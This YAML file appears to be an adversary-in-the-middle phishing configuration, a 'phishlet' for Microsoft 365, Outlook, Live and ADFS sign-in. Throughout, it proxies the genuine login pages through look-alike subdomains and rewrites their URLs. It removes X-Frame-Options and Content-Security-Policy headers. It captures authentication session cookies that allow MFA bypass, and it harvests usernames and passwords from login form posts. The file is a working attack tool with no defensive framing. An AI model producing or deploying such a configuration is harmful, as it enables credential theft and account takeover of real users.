min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'windows.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'windows.net', search: 'https://login\\.windows\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://outlook\\.office365\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://outlook\\.office\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://www\\.office\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://login\\.live\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'live.com', search: 'https://account\\.live\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  
  # Remove security headers
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  
  # ADFS domain replacements
  - {triggers_on: 'adfs.*', orig_sub: 'adfs', domain: '*', search: 'https://adfs\\.([a-zA-Z0-9.-]+)', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'fs.*', orig_sub: 'fs', domain: '*', search: 'https://fs\\.([a-zA-Z0-9.-]+)', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'sts.*', orig_sub: 'sts', domain: '*', search: 'https://sts\\.([a-zA-Z0-9.-]+)', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  # Primary Microsoft authentication cookies
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'ch', 'fpc', 'x-ms-gateway-slice', 'stsservicecookie']
    type: 'cookie'
    force_post: false
  
  # Windows.net authentication cookies
  - domain: '.login.windows.net'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'ch', 'fpc', 'x-ms-gateway-slice', 'stsservicecookie']
    type: 'cookie'
    force_post: false
  
  # Office 365 session cookies
  - domain: '.office365.com'
    keys: ['OIDC', 'RPSAuth', 'RPSSecAuth', 'UserIndex', 'MUID']
    type: 'cookie'
    force_post: false
  
  # Office.com cookies
  - domain: '.office.com'
    keys: ['OIDC', 'RPSAuth', 'RPSSecAuth', 'MUID', 'MC1', 'MSCC']
    type: 'cookie'
    force_post: false
  
  # Outlook specific cookies
  - domain: '.outlook.office365.com'
    keys: ['OutlookSession', 'UC', 'X-OWA-CANARY', 'ClientId', 'RPSAuth', 'RPSSecAuth']
    type: 'cookie'
    force_post: false
  
  # Live.com authentication
  - domain: '.login.live.com'
    keys: ['MSPAUTH', 'MSPAuth', 'MSPProf', 'MSPRequ', 'MSPCID', 'RPSSecAuth', 'MSPBack', 'MSPPre', 'WLSSC', 'SDIDC', 'RpsContextCookie']
    type: 'cookie'
    force_post: false
  
  # Live.com account cookies
  - domain: '.account.live.com'
    keys: ['MSPAUTH', 'MSPAuth', 'MSPProf', 'MSPRequ', 'MSPCID', 'RPSSecAuth']
    type: 'cookie'
    force_post: false
  
  # ADFS specific cookies
  - domain: 'adfs.*'
    keys: ['MSISAuth', 'MSISAuthenticated', 'MSISSignOut', 'MSISLoopDetectionCookie', 'MSISAuth1', 'MSISAuth2']
    type: 'cookie'
    force_post: false
  
  # Additional ADFS patterns
  - domain: 'fs.*'
    keys: ['MSISAuth', 'MSISAuthenticated', 'MSISSignOut', 'MSISLoopDetectionCookie']
    type: 'cookie'
    force_post: false
  
  - domain: 'sts.*'
    keys: ['MSISAuth', 'MSISAuthenticated', 'MSISSignOut', 'MSISLoopDetectionCookie']
    type: 'cookie'
    force_post: false

  # Session state cookies
  - domain: '.microsoftonline.com'
    keys: ['SignInStateCookie', 'CCState', 'AADSSO', 'SSOCOOKIEPULLED', 'buid', 'esctx']
    type: 'cookie'
    force_post: false

  # Additional tracking cookies
  - domain: '.live.com'
    keys: ['PPLState', 'NAP', 'ANON', 'OParams']
    type: 'cookie'
    force_post: false

credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
  
  # Alternative username field
  usernameCreds:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  # Alternative password field
  passwordCreds:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # ADFS username
  adfsUsername:
    key: 'UserName'
    search: '(.*)'
    type: 'post'
  
  # ADFS password
  adfsPassword:
    key: 'Password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/kmsi'
  - '/reprocess'
  - '/frowny'
  - '/login.srf'
  - '/ppsecure/post.srf'
  - '/adfs/ls/'
  - '/adfs/oauth2/'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
